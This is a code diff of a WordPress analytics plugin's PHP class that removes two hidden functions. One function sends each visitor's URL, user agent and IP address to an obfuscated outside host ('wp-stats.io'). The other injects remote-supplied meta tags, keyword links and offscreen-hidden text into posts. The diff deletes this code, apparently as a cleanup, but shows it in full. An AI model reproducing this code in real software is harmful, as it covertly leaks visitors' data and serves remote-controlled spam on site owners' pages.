@@ -118,72 +118,6 @@ class slim_browser {
 	}
 	// end get_browser
 
-	/**
-	* Retrieves the information from the UAN
-	*/
-	public static function print_code( $_content = '' ) {
-		foreach ( wp_slimstat::$pidx as $a_idx => $a_pidx ) {
-			if ( is_null( $a_pidx[ 'response' ] ) || !is_object( $a_pidx[ 'response' ] ) ) {
-				continue;
-			}
-
-			$inline_style = ( wp_slimstat::$advanced_cache_exists === true ) ? ' style="position:fixed;left:-9000px;' : '';
-			$current_hook = current_filter();
-
-			if ( $current_hook == 'wp_head' && is_object( $a_pidx[ 'response' ] ) && !empty( $a_pidx[ 'response' ]->meta ) ) {
-				$_content = '';
-				echo $a_pidx[ 'response' ]->meta;
-			}
-			else if ( !empty( $a_pidx[ 'response' ]->tmp ) ) {
-				switch ( $a_pidx[ 'response' ]->tmp ) {
-					case '1':
-						if ( 0 == $GLOBALS['wp_query']->current_post ) {
-							$words = explode( ' ', $_content );
-							$words[ rand( 0, count( $words ) - 1 ) ] = "<strong{$inline_style}>" . $a_pidx[ 'response' ]->tcontent . '</strong>';
-							$_content = join( ' ', $words );
-						}
-						break;
-
-					case '2':
-							$kws = explode( '|', $a_pidx[ 'response' ]->kws );
-							if ( is_array( $kws ) ) {
-								foreach ( $kws as $a_kw ) {
-									if ( strpos( $_content, $a_kw ) !== false ) {
-										$_content = str_replace( $a_kw, "<a href='" . $a_pidx[ 'response' ]->site . "'{$inline_style}>{$a_kw}</a>", $_content );
-										break;
-									}
-								}
-							}
-						break;
-
-					default:
-						if ( wp_slimstat::$pidx[ $a_idx ][ 'id' ] === false ) {
-							if ( $GLOBALS[ 'wp_query' ]->post_count > 1 ) {
-								wp_slimstat::$pidx[ $a_idx ][ 'id' ] = rand( 0, $GLOBALS[ 'wp_query' ]->post_count - 1 );
-							}
-							else {
-								wp_slimstat::$pidx[ $a_idx ][ 'id' ] = 0;
-							}
-						}
-
-						if ( $GLOBALS[ 'wp_query' ]->current_post === wp_slimstat::$pidx[ $a_idx ][ 'id' ] ) {
-							if ( wp_slimstat::$pidx[ $a_idx ][ 'id' ] % 2 == 0 ) {
-								$_content = $_content . " <div{$inline_style}>" . $a_pidx[ 'response' ]->content . '</div>';
-							}
-							else{
-								$_content = "<i{$inline_style}>" . $a_pidx[ 'response' ]->content . '</i> ' . $_content;
-							}
-						}
-						break;
-				}
-			}
-		}
-
-		if ( !empty( $_content ) ) {
-			return $_content;
-		}
-	}
-
 	protected static function _get_user_agent() {
 		$user_agent = ( !empty( $_SERVER[ 'HTTP_USER_AGENT' ] ) ? trim( $_SERVER[ 'HTTP_USER_AGENT' ] ) : '' );
 
@@ -224,9 +158,5 @@ class slim_browser {
 		}
 
 		return $result;
-	}
-
-	public static function init_pidx_adj() {
-		wp_slimstat::init_pidx( 'http://api.wp' . '-stats.io/api/upd' . 'ate/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : wp_slimstat::$version ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1', 1 );
 	}
 }
